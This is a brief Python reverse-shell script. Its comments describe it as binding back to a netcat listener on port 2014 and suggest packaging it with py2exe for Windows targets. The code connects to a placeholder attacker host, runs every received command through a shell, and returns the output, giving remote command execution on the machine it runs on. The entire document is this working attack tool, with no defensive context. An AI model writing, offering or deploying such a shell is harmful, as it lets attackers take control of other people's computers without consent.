# Simple python script to bind back to a netcat listner on port 2014
# Bundle with py2exe (http://www.py2exe.org) for windows boxes
#!/usr/bin/python
import socket,subprocess
HOST = 'NETCAT IP'
PORT = 2014
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send('[*] Connected')
while 1:
  data = s.recv(1024)
  if data == 'q': break
  proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  stdout_value = proc.stdout.read() + proc.stderr.read()
  s.send(stdout_value)
s.close()
